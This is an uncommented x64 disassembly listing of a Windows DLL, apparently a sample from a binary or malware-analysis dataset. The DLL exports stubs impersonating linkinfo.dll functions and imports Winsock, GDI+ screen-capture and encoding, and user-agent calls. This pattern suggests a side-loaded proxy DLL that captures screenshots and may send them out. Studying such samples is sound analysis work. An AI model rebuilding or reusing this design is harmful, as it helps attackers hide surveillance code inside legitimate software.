mov rcx rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
jmp sub_1800200a0
sub_18000d830
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
test [ rdx + rcx + 0x18 ] 0x2
je r-xdata
add rsp 0x38
retn
call sub_18000d6f0
nop
sub_18000f920
push rbx
sub rsp 0x20
add rcx 0x18
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call sub_18000e2c0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180012b50
sub rsp 0x28
call sub_180012040
xor eax eax
add rsp 0x28
retn
sub_180012d60
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180012ba0
mov rcx [ rbx ]
add rsp 0x20
pop rbx
jmp j_sub_18002094c#2
sub_180013400
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
call sub_180014cd0
nop
xor ecx ecx
call sub_180021948
sub_180013430
sub rsp 0x28
or ecx 0xffffffff
call [ Sleep@IAT ]
xor eax eax
add rsp 0x28
retn
sub_1800134c0
mov rax [ rcx ]
mov r8 [ rcx + 0x18 ]
mov [ rdx + 0x8 ] 0x0
mov [ rdx ] rax
mov [ rdx + 0x10 ] r8
mov rax rdx
retn
sub_1800135f0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180013560
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
sub_180013e60
mov [ rcx + 0x70 ] rdx
retn
sub_180015340
sub rsp 0x28
call WSACleanup
mov al 0x1
add rsp 0x28
retn
sub_180015350
movzx eax [ rcx + 0x6c ]
retn
sub_180016c60
add rcx 0x10
jmp sub_180002870
sub_180017530
xor eax eax
mov [ rcx + 0x8 ] r8
mov [ rcx ] rdx
mov [ rcx + 0x20 ] rax
mov [ rcx + 0x28 ] rax
mov rax [ rsp + 0x28 ]
mov [ rcx + 0x18 ] rax
mov rax rcx
mov [ rcx + 0x10 ] r9
retn
j_sub_1800175b0
jmp sub_1800175b0
sub_180017e80
mov [ rcx ] 0x0
mov rax rcx
retn
sub_180017f00
sub rsp 0x28
mov rcx [ rcx ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
call sub_18002094c
sub_180018320
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
sub rsp 0x38
lea rax [ rsp + 0x58 ]
xor r9d r9d
mov [ rsp + 0x20 ] rax
call sub_180021d40
add rsp 0x38
retn
sub_180018350
mov rcx [ rcx + 0x10 ]
jmp j_sub_18002094c#2
sub_180018360
sub rsp 0x28
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
mov edx 0x1
call [ rax + 0x10 ]
sub_180018380
xor eax eax
cmp [ rcx + 0x58 ] rax
sete al
retn
sub_18001c270
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_18001f270
lea rax [ r--data ]
mov [ rcx + 0x8 ] 0x0
mov [ rcx ] rax
mov rax rcx
retn
CompareLinkInfoReferents
jmp [ rw-data ]
CompareLinkInfoVolumes
jmp [ rw-data ]
CreateLinkInfo
jmp [ rw-data ]
CreateLinkInfoA
jmp [ rw-data ]
CreateLinkInfoW
jmp [ rw-data ]
DestroyLinkInfo
jmp [ rw-data ]
DisconnectLinkInfo
jmp [ rw-data ]
GetCanonicalPathInfo
jmp [ rw-data ]
GetCanonicalPathInfoA
jmp [ rw-data ]
GetCanonicalPathInfoW
jmp [ rw-data ]
GetLinkInfoData
jmp [ rw-data ]
IsValidLinkInfo
jmp [ rw-data ]
ResolveLinkInfo
jmp [ rw-data ]
ResolveLinkInfoA
jmp [ rw-data ]
ResolveLinkInfoW
jmp [ rw-data ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
j_sub_180020498
jmp sub_180020498
sub_18001f694
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001f6b8
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
sub_18001f6f0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001f714
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
sub_18001f74c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180021000
jmp sub_180021000
sub_18001f944
sub rsp 0x28
call sub_180022bd8
mov ecx [ rax + 0x8 ]
mov [ rsp + 0x30 ] ecx
call sub_180022ba0
mov [ rsp + 0x34 ] eax
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_18001fb48
sub rsp 0x28
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_18001f9f0
lea rcx [ rw-data ]
call sub_18001fae0
and [ rw-data ] 0x0
lea rcx [ rsp + 0x30 ]
call sub_18001fa20
add rsp 0x28
retn
sub_18001fb7c
mov rax [ rw-data ]
retn
sub_18001fb84
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx rcx
jne r-xdata
mov [ rw-data ] rbx
add rsp 0x20
pop rbx
retn
lea rcx [ sub_18001fb48 ]
mov [ rw-data ] 0x1
call sub_180020330
sub_18001fc64
sub rsp 0x28
mov rdx [ rcx + 0x28 ]
test rdx rdx
je r-xdata
add rsp 0x28
retn
xor ecx ecx
call sub_180023b10
sub_18001fec8
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18002094c#2
sub_18001ff28
cmp rcx [ rdx + 0x8 ]
jne r-xdata
xor eax eax
retn
cmp [ rdx ] r8d
jne r-xdata
mov eax 0x1
retn
sub_18001ff3c
mov rax [ rcx + 0x8 ]
retn
sub_18001ff44
mov rax [ rcx + 0x10 ]
retn
sub_18001ff4c
mov [ rdx ] r8d
mov [ rdx + 0x8 ] rcx
mov rax rdx
retn
sub_18001ff58
lea rax [ rw-data ]
retn
sub_18002022c
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x28
call sub_180021000
mov rcx rax
mov [ rbx ] rax
call InitializeCriticalSection
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180020254
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call DeleteCriticalSection
mov rcx [ rbx ]
add rsp 0x20
pop rbx
jmp j_sub_18002094c#2
sub_180020274
mov rcx [ rcx ]
jmp EnterCriticalSection
sub_18002027c
mov rcx [ rcx ]
jmp LeaveCriticalSection
j_sub_1800241dc
jmp sub_1800241dc
sub_1800202f4
sub rsp 0x28
lea rcx [ sub_18002028c ]
call sub_180021c0c
neg eax
sbb eax eax
and eax 0x18
add rsp 0x28
retn
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
sub_180020370
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_18002038c
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
cmovne rax [ rcx + 0x8 ]
retn
sub_1800203fc
push rbx
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov rbx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
mov [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call sub_18002094c
sub_180020498
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800203fc
sub_1800204a8
mov [ rsp + 0x10 ] rdx
push rbx
sub rsp 0x20
lea rdx [ rsp + 0x38 ]
mov rbx rcx
call sub_180020424
lea r11 [ r--data ]
mov rax rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
retn
sub_180020510
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x10 ] 0x0
call sub_180020454
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18002053c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18002059c
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_180025410
test eax eax
sete al
add rsp 0x28
retn
sub_180020aa8
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180025c90
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_180020ac4
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180025c90
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_1800212e0
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_180026154
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_1800214f0
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_18002148c
mov eax 0x1
add rsp 0x28
retn
sub_1800215e8
test r8 r8
je r-xdata
neg r8
sbb rax rax
and rax rcx
retn
cmp [ rcx ] dl
je r-xdata
inc rcx
dec r8
jne r-xdata
sub_180021604
sub rsp 0x28
call sub_180025c90
mov rcx [ rw-data ]
cmp [ rax + 0xc0 ] rcx
je r-xdata
mov rax [ rw-data ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_180026bfc
sub_1800217c4
mov r11 rsp
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
lea rax [ r11 + 0x20 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_180027950
add rsp 0x38
retn
j_sub_1800217e8
jmp sub_1800217e8
sub_180021948
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180025c0c
test rax rax
je r-xdata
mov ecx ebx
call [ ExitThread@IAT ]
mov rcx rax
call sub_180025de8
sub_18002196c
mov [ rw-data ] rcx
retn
sub_180021a78
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180025c90
mov [ rax + 0x1c ] ebx
add rsp 0x20
pop rbx
retn
sub_180021a90
sub rsp 0x28
call sub_180025c90
mov ecx [ rax + 0x1c ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ rax + 0x1c ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
add rsp 0x28
retn
sub_180021c0c
sub rsp 0x28
call sub_180021b00
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_180021df4
mov r11 rsp
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
lea rax [ r11 + 0x20 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_180021d78
add rsp 0x38
retn
sub_180023e24
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180020498
sub_1800241ab
call sub_1800260ac
sub_1800241dc
sub rsp 0x28
call sub_180025c90
xor ecx ecx
cmp [ rax + 0x100 ] ecx
setne al
add rsp 0x28
retn
sub_1800246c0
call sub_1800260ac
sub_18002477e
call sub_1800260ac
sub_180024f60
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800252a0
sub rsp 0x38
cmp r9d 0xa
jne r-xdata
and [ rsp + 0x20 ] 0x0
test ecx ecx
jns r-xdata
mov [ rsp + 0x20 ] 0x1
jmp r-xdata
call sub_1800251ac
add rsp 0x38
retn
sub_180025308
mov eax [ rw-data ]
mov r8d edx
and ecx edx
not r8d
and r8d eax
or r8d ecx
mov [ rw-data ] r8d
retn
sub_1800254b8
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_18002596c
mov [ rw-data ] rcx
retn
sub_1800259cc
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_180025a78
mov r8 [ rdx ]
jmp sub_1800259ec
sub_180025a80
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_1800259ec
sub_180025aa8
movsxd rdx [ r8 + 0x1c ]
mov rax [ rcx ]
mov [ rdx + rax ] r9d
retn
sub_180025af0
push rbx
sub rsp 0x20
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_18002098c
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
mov eax [ rax + rcx + 0x4 ]
add rsp 0x20
pop rbx
retn
sub_180025b28
xor eax eax
retn
sub_180025b2c
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_18002cf20
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1800260ac
sub rsp 0x28
call sub_180025c90
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_1800252c8
call rcx
jmp r-xdata
sub_1800260ca
add rsp 0x28
retn
sub_1800260d0
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call sub_1800260ac
call rax
jmp r-xdata
sub_1800260f0
add rsp 0x28
retn
sub_1800260f8
sub rsp 0x28
lea rcx [ sub_1800260ac ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_180026118
mov [ rw-data ] rcx
retn
sub_18002633c
mov [ rw-data ] rcx
retn
sub_180026590
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180026554
mov ecx ebx
call [ ExitProcess@IAT ]
sub_1800265a8
mov ecx 0x8
jmp sub_18002d0a8
sub_1800265b4
mov ecx 0x8
jmp sub_18002cfa8
sub_1800268b4
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_180026724
sub_1800268c0
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_180026724
sub_1800268d0
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18002574c
mov ecx ebx
call sub_1800254ec
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_180026724
int3
sub_180027ae0
movsd xmm0 [ rcx ]
comisd xmm0 [ r--data ]
jb r-xdata
xor eax eax
retn
mov eax 0x1
retn
sub_180027b3c
xor r9d r9d
jmp sub_180027af8
sub_180027b44
xor edx edx
jmp sub_1800279c0
j_sub_180027a40
xor edx edx
jmp sub_180027a40
sub_18002869c
sub rsp 0x48
mov eax [ rsp + 0x78 ]
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] eax
call sub_180028604
add rsp 0x48
retn
sub_1800288c8
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_1800286f8
sub_18002b1e8
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_18002b008
mov [ rw-data ] 0x1
sub_18002cfa8
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_18002dcf4
lea rax [ rw-data ]
retn
sub_18002dcfc
lea rax [ rw-data ]
retn
sub_18002dd60
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_18002dd68
neg rcx
sbb eax eax
and eax 0x1
retn
sub_18002dd90
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_18002ddc0
mov [ rsp + 0x8 ] rcx
mov [ rsp + 0x18 ] rdx
mov [ rsp + 0x10 ] r8d
mov r9 0x19930520
jmp sub_18002dde0
sub_18002dde0
retn
sub_18002ddf0
retn
sub_18002ddf4
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_18002de14
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_18002e330
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_18002e614
and [ rw-data ] 0x0
retn
sub_18002f174
sub rsp 0x28
call sub_1800312e8
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_18002094c
call sub_180031088
sub_18002f280
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
jmp sub_18002cfa8
sub_18002f358
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_1800302b0
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
jmp sub_180030160
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
retn
add ecx 0x20
sub_180030aa0
xor r9d r9d
jmp sub_180030928
sub_180030b24
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_180030aa8
sub_180030c94
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_180031560
sub_180031004
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_1800312e8
mov ecx 0x1
jmp sub_1800311fc
sub_1800335d0
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileW@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_18003360c
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipCreateBitmapFromHBITMAP
jmp [ GdipCreateBitmapFromHBITMAP@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GetProcessImageFileNameW
jmp [ GetProcessImageFileNameW@IAT ]
ObtainUserAgentString
jmp [ ObtainUserAgentString@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
sub_180033c20
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180020498
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180033c50
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180020498
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180033d70
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x30 ]
mov rcx [ rbp + 0x38 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_180033e10
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180020498
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180033e80
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
sub_180033f50
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x68 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_180034030
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x68 ]
call sub_180020498
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180034060
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x68 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_1800340c0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x58 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
sub_180034110
mov rcx [ rdx + 0x80 ]
jmp j_sub_18002094c#2
sub_180034120
lea rcx [ rdx + 0x20 ]
jmp sub_180004cc0
sub_180034130
lea rcx [ rdx + 0x40 ]
jmp sub_180018390
sub_180034140
mov rcx [ rdx + 0x110 ]
jmp j_sub_18002094c#2
sub_180034150
lea rcx [ rdx + 0x50 ]
jmp sub_180018390
sub_180034170
lea rcx [ rdx + 0x68 ]
jmp sub_180001820
sub_180034180
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x48 ]
mov rcx [ rbp + 0x50 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_1800341a0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x48 ]
mov rcx [ rbp + 0x50 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_1800341c0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x60 ]
mov rcx [ rbp + 0x58 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_180034280
mov rcx [ rdx + 0x50 ]
add rcx 0x48
jmp sub_180003530
sub_180034290
mov rcx [ rdx + 0x50 ]
add rcx 0x70
jmp sub_180003530
sub_1800342a0
mov rcx [ rdx + 0x50 ]
add rcx 0x98
jmp sub_1800064a0
sub_1800342c0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_1800342d0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_1800342e0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_1800342f0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_180034300
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_180034310
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_180034330
mov rcx [ rdx + 0x40 ]
add rcx 0x48
jmp sub_180003530
sub_180034340
mov rcx [ rdx + 0x40 ]
add rcx 0x70
jmp sub_180003530
sub_180034350
mov rcx [ rdx + 0x40 ]
add rcx 0x98
jmp sub_1800064a0
sub_1800343a0
mov rcx [ rdx + 0x168 ]
jmp sub_180018390
sub_180034470
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x78 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_180034490
lea rcx [ rdx + 0x78 ]
jmp sub_1800034f0
sub_1800344a0
lea rcx [ rdx + 0x50 ]
jmp sub_1800034f0
sub_1800344b0
lea rcx [ rdx + 0x78 ]
jmp sub_1800034f0
sub_1800344c0
lea rcx [ rdx + 0x78 ]
jmp sub_1800034f0
sub_1800344d0
mov rcx [ rdx + 0x40 ]
jmp sub_180001820
sub_1800344e0
lea rcx [ rdx + 0x48 ]
jmp sub_180001820
sub_1800344f0
lea rcx [ rdx + 0x70 ]
jmp sub_180001820
sub_180034500
mov rcx [ rdx + 0x40 ]
jmp sub_180007880
sub_180034520
mov rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_180001820
sub_180034530
mov rcx [ rdx + 0x40 ]
add rcx 0x48
jmp sub_180008f70
sub_180034540
mov rcx [ rdx + 0x48 ]
jmp sub_180007880
sub_180034550
mov rcx [ rdx + 0x48 ]
jmp sub_180018390
sub_180034570
mov rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_180001820
sub_180034580
mov rcx [ rdx + 0x40 ]
add rcx 0x48
jmp sub_180008f70
sub_180034590
mov rcx [ rdx + 0x48 ]
jmp j_sub_18002094c#2
sub_1800345a0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x40 ]
mov rcx [ rbp + 0x48 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_1800345c0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x40 ]
mov rcx [ rbp + 0x48 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_180034610
lea rcx [ rdx + 0x38 ]
jmp sub_180001820
sub_180034620
lea rcx [ rdx + 0x38 ]
jmp sub_180001820
sub_180034630
mov rcx [ rdx + 0x50 ]
jmp j_sub_18002094c#2
sub_180034640
lea rcx [ rdx + 0x30 ]
jmp j_sub_180002870
sub_180034650
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180034660
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_180034670
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034680
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034690
lea rcx [ rdx + 0x740 ]
jmp sub_180001820
sub_1800346a0
lea rcx [ rdx + 0x6f0 ]
jmp sub_180001820
sub_1800346b0
lea rcx [ rdx + 0x30 ]
jmp j_sub_180002870
sub_1800346c0
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_1800346d0
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_1800346e0
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_1800346f0
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034700
lea rcx [ rdx + 0x768 ]
jmp sub_180001820
sub_180034710
lea rcx [ rdx + 0x7b8 ]
jmp sub_180001820
sub_180034720
lea rcx [ rdx + 0x30 ]
jmp j_sub_180002870
sub_180034730
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180034740
lea rcx [ rdx + 0x650 ]
jmp sub_180001820
sub_180034750
lea rcx [ rdx + 0x718 ]
jmp sub_180001820
sub_180034760
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_180034770
lea rcx [ rdx + 0x678 ]
jmp sub_180001820
sub_180034780
lea rcx [ rdx + 0x6a0 ]
jmp sub_180001820
sub_180034790
lea rcx [ rdx + 0x6c8 ]
jmp sub_180001820
sub_1800347a0
lea rcx [ rdx + 0x628 ]
jmp sub_180001820
sub_1800347b0
lea rcx [ rdx + 0x30 ]
jmp j_sub_180002870
sub_1800347c0
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_1800347d0
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_1800347e0
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_1800347f0
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034800
lea rcx [ rdx + 0x790 ]
jmp sub_180001820
sub_180034810
lea rcx [ rdx + 0x830 ]
jmp sub_180001820
sub_180034820
lea rcx [ rdx + 0x30 ]
jmp j_sub_180002870
sub_180034830
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180034840
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_180034850
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034860
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034870
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034880
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034890
lea rcx [ rdx + 0x808 ]
jmp sub_180001820
sub_1800348a0
lea rcx [ rdx + 0x7e0 ]
jmp sub_180001820
sub_1800348b0
lea rcx [ rdx + 0x28 ]
jmp sub_180018390
sub_1800348c0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x58 ]
jmp j_sub_18002094c#2
sub_1800348f0
mov rcx [ rdx + 0x50 ]
add rcx 0x8
